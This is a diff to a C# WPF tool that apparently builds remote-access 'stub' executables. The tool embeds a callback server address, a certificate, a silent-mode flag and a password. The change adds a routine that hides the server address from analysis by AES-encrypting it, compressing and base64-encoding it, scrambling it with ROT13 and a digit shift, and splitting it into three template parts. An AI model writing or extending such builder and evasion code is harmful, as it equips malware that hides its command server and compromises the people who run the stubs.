@@ -3587,20 +3587,22 @@ namespace WpfApp
             string certBase64 = Convert.ToBase64String(
                 CertificateManager.GetCertificatePublicKeyBytes(_serverCertificate));
 
+            string url = $"{builderIpTextBox.Text.Trim()}:{builderPortTextBox.Text.Trim()}";
+            string obfuscated = ObfuscateUrl(url, out string aesKey, out string aesIv);
+            var parts = obfuscated.Split('\u00a4');
+
             stubCode = stubCode
-                .Replace("{{SERVER_URL}}", $"{builderIpTextBox.Text.Trim()}:{builderPortTextBox.Text.Trim()}")
+                .Replace("{{URL_PART1}}", parts[0])
+                .Replace("{{URL_PART2}}", parts[1])
+                .Replace("{{URL_PART3}}", parts[2])
+                .Replace("{{AES_KEY}}", aesKey)
+                .Replace("{{AES_IV}}", aesIv)
+                .Replace("{{SERVER_URL}}", url)
                 .Replace("{{CERTIFICATE}}", certBase64)
                 .Replace("{{SILENT_MODE}}", silentMode ? "true" : "false")
                 .Replace("{{PASSWORD}}", _builderActualPassword);
 
-            if (stubCode.Contains("{{SILENT_MODE}}"))
-            {
-                AppendLog("ERROR: SILENT_MODE placeholder was not replaced.");
-                BuilderOutput("ERROR: SILENT_MODE placeholder was not replaced.");
-                UpdateStatus("EXE compilation failed.");
-                return;
-            }
-            if (stubCode.Contains("{{SERVER_URL}}") || stubCode.Contains("{{CERTIFICATE}}") || stubCode.Contains("{{SILENT_MODE}}") || stubCode.Contains("{{PASSWORD}}"))
+            if (stubCode.Contains("{{SILENT_MODE}}") || stubCode.Contains("{{URL_PART1}}") || stubCode.Contains("{{AES_KEY}}"))
             {
                 AppendLog("ERROR: Some placeholders were not replaced.");
                 BuilderOutput("ERROR: Some placeholders were not replaced.");
@@ -3690,16 +3692,23 @@ namespace WpfApp
             string serverAddress = $"{serverIp}:{port}";
             AppendLog($"Stub target: {serverAddress}");
 
+            string obfuscated = ObfuscateUrl(serverAddress, out string aesKey, out string aesIv);
+            var parts = obfuscated.Split('\u00a4');
+
             content = content
+                .Replace("{{URL_PART1}}", parts[0])
+                .Replace("{{URL_PART2}}", parts[1])
+                .Replace("{{URL_PART3}}", parts[2])
+                .Replace("{{AES_KEY}}", aesKey)
+                .Replace("{{AES_IV}}", aesIv)
                 .Replace("{{SERVER_URL}}", serverAddress)
                 .Replace("{{SERVER_IP}}", serverIp)
                 .Replace("{{SERVER_PORT}}", port)
                 .Replace("{{PASSWORD}}", password)
                 .Replace("{{ENCRYPTION_KEY}}", encryptionKey);
 
-            if (content.Contains("{{SERVER_URL}}") || content.Contains("{{PASSWORD}}") ||
-                content.Contains("{{ENCRYPTION_KEY}}") || content.Contains("{{SERVER_IP}}") ||
-                content.Contains("{{SERVER_PORT}}"))
+            if (content.Contains("{{URL_PART1}}") || content.Contains("{{AES_KEY}}") ||
+                content.Contains("{{PASSWORD}}") || content.Contains("{{SERVER_URL}}"))
             {
                 AppendLog("WARNING: Some placeholders were not replaced. Check template format.");
             }
@@ -3711,6 +3720,50 @@ namespace WpfApp
             }
 
             return content;
+        }
+
+        private string ObfuscateUrl(string url, out string keyStr, out string ivStr)
+        {
+            using var aes = Aes.Create();
+            aes.GenerateKey(); aes.GenerateIV();
+            keyStr = string.Join(", ", aes.Key.Select(b => (int)b));
+            ivStr = string.Join(", ", aes.IV.Select(b => (int)b));
+
+            var plaintext = Encoding.UTF8.GetBytes(url);
+            using var encryptor = aes.CreateEncryptor();
+            using var ms = new MemoryStream();
+            using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
+                cs.Write(plaintext, 0, plaintext.Length);
+            var ciphertext = ms.ToArray();
+
+            using var compressed = new MemoryStream();
+            using (var gzip = new GZipStream(compressed, CompressionLevel.Optimal))
+                gzip.Write(ciphertext, 0, ciphertext.Length);
+            var compressedBytes = compressed.ToArray();
+
+            var b64 = Convert.ToBase64String(compressedBytes);
+            var scrambled = ScrambleUrl(b64);
+
+            int len = scrambled.Length;
+            int p1 = len / 3;
+            int p2 = len * 2 / 3;
+            return $"{scrambled.Substring(0, p1)}\u00a4{scrambled.Substring(p1, p2 - p1)}\u00a4{scrambled.Substring(p2)}";
+        }
+
+        private static string ScrambleUrl(string s)
+        {
+            var sb = new StringBuilder(s.Length);
+            foreach (char c in s)
+            {
+                if (c >= 'A' && c <= 'Z') sb.Append((char)((c - 'A' + 13) % 26 + 'A'));
+                else if (c >= 'a' && c <= 'z') sb.Append((char)((c - 'a' + 13) % 26 + 'a'));
+                else if (c >= '0' && c <= '9') sb.Append((char)((c - '0' + 5) % 10 + '0'));
+                else if (c == '+') sb.Append('!');
+                else if (c == '/') sb.Append('?');
+                else if (c == '=') sb.Append('*');
+                else sb.Append(c);
+            }
+            return sb.ToString();
         }
 
         private static string StripPowerShellDebug(string content)
